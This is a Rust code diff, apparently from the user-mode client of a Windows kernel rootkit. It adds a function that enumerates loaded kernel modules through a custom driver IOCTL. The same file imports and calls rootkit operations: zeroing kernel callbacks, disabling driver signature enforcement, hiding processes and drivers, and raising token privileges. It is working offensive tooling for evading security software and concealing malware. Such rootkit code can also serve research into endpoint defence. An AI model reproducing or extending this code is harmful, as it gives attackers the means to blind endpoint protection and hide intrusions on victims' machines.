@@ -1,6 +1,6 @@
 use std::{mem::size_of, ptr::null_mut};
 use winapi::{um::{ioapiset::DeviceIoControl}, ctypes::c_void};
-use common::{TargetProcess, IOCTL_PROCESS_PROTECT_REQUEST, IOCTL_PROCESS_UNPROTECT_REQUEST, IOCTL_PROCESS_TOKEN_PRIVILEGES_REQUEST, IOCTL_CALLBACKS_ENUM_REQUEST, CallBackInformation, TargetCallback, IOCTL_CALLBACKS_ZERO_REQUEST, IOCTL_DSE_ENABLE_DISABLE_REQUEST, DriverSignatureEnforcement, IOCTL_PROCESS_HIDE_REQUEST, IOCTL_DRIVER_HIDE_REQUEST};
+use common::{TargetProcess, IOCTL_PROCESS_PROTECT_REQUEST, IOCTL_PROCESS_UNPROTECT_REQUEST, IOCTL_PROCESS_TOKEN_PRIVILEGES_REQUEST, IOCTL_CALLBACKS_ENUM_REQUEST, CallBackInformation, TargetCallback, IOCTL_CALLBACKS_ZERO_REQUEST, IOCTL_DSE_ENABLE_DISABLE_REQUEST, DriverSignatureEnforcement, IOCTL_PROCESS_HIDE_REQUEST, IOCTL_DRIVER_HIDE_REQUEST, IOCTL_DRIVER_ENUM_REQUEST, ModuleInformation};
 
 /// Protect a process as PsProtectedSignerWinTcb
 pub fn protect_process(process_id: u32, driver_handle: *mut c_void) {
@@ -112,7 +112,7 @@ pub fn enumerate_callbacks(driver_handle: *mut c_void) {
     }
 }
 
-/// Remove the protection of a process
+/// Patch kernel callbacks
 pub fn patch_callback(index: u32, driver_handle: *mut c_void) {
     let mut bytes: u32 = 0;
     
@@ -224,4 +224,39 @@ pub fn hide_driver(driver_handle: *mut c_void) {
     }
 
     println!("[+] Driver hidden successfully");
+}
+
+/// Get a list of all loaded modules using PsLoadedModuleList
+pub fn get_loaded_modules_list(driver_handle: *mut c_void) {
+    let mut bytes: u32 = 0;
+    //let mut module_information = [(); 256].map(|_| ModuleInformation::default());
+    let mut module_information: [ModuleInformation; 256] = unsafe { std::mem::zeroed() };
+
+    
+    let device_io_control_result = unsafe { 
+        DeviceIoControl(driver_handle,
+        IOCTL_DRIVER_ENUM_REQUEST,
+        null_mut(),
+        0,
+        module_information.as_mut_ptr() as *mut _,
+        (module_information.len() * size_of::<ModuleInformation>()) as u32,
+        &mut bytes,
+        null_mut())
+    };
+
+    if device_io_control_result == 0 {
+        panic!("[-] Failed to call DeviceIoControl");
+    }
+
+    let numer_of_modules = (bytes / size_of::<ModuleInformation>() as u32) as usize;
+    println!("Total Number of Modules: {:?}", numer_of_modules);
+
+    for i in 0..numer_of_modules {
+        if  module_information[i].module_base > 0 {
+            let name = String::from_utf16_lossy(&module_information[i].module_name).trim_end_matches('\0').to_owned();
+            println!("[{:?}] {:#x} {:?}", i, module_information[i].module_base, name);
+        }
+    }
+
+    println!("[+] Loaded modules enumerated successfully");
 }
